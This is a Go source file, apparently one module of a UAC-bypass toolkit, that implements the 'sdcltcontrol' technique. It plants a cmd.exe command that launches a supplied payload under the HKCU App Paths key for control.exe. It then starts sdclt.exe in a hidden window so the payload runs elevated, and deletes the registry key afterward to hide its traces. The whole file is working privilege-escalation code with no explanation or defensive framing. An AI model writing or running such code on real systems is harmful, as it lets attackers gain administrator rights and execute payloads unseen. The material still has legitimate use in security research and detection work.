package guacbypasser

import (
	"fmt"
	"path/filepath"
	"syscall"
	"time"

	"golang.org/x/sys/windows/registry"
)

func tSdcltcontrol(path string) error {
	_ = Reporter{
		Name: "sdcltcontrol",
		Desc: "Bypass UAC using sdclt (app paths) and registry key manipulation",
		Id:   8,

		Type:   "Once",
		Module: "tSdcltcontrol",

		Fixed:   true,
		FixedIn: "16215",

		Admin:   false,
		Payload: true,
	}

	fullPath, err := filepath.Abs(path)
	if err != nil {
		return err
	}
	cmdN := fmt.Sprintf("%s /k start %s", `C:\Windows\System32\cmd.exe`, fullPath)

	if _, _, err = registry.CreateKey(
		registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`,
		registry.SET_VALUE); err != nil {

		return err
	}
	wk32, err := registry.OpenKey(
		registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	defer wk32.Close()
	if err != nil {
		return err
	}

	if err := wk32.SetStringValue("", cmdN); err != nil {
		return err
	}
	time.Sleep(3 * 1 * time.Second)

	cmd := newCmd("start sdclt.exe")
	cmd.exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if _, err = cmd.exec.Output(); err != nil {
		return err
	}
	time.Sleep(3 * 1 * time.Second)
	if err = registry.DeleteKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`); err != nil {
		return err
	}
	return nil
}
